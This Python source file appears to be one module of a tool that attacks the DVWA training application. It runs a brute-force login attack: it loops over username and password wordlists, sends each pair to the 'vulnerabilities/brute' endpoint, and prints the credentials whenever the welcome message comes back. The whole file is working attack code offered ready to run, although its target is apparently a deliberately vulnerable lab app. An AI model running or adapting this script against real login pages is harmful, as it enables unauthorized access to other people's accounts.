
import requests
from urllib.parse import urljoin , urlencode , urlparse
from core.common import makeHeaders

def exploit(url,cookies={}):
    
    q = input("\nDo you want perform brute force attack [y:N]: ")
    if q.lower() == 'n':
        return

    print("\nBrute Force Attack :")
    users = [user.strip() for user in open('tools/lists/users.lst').readlines()]
    headers = makeHeaders(urlparse(url).hostname)

    for password in open('tools/lists/password2.lst','r').readlines():
        password = password.strip()
        for user in users:
            payload = {
                'username' : user,
                'password' : password,
                'Login'    : 'Login'
            }

            full_url = urljoin(url, 'vulnerabilities/brute/?' + urlencode(payload))
            res = requests.get(full_url,cookies=cookies,headers=headers)

            if f"Welcome to the password protected area {user}" in res.text:
                print(f"\t{user} \t=>   {password}")
                users.remove(user)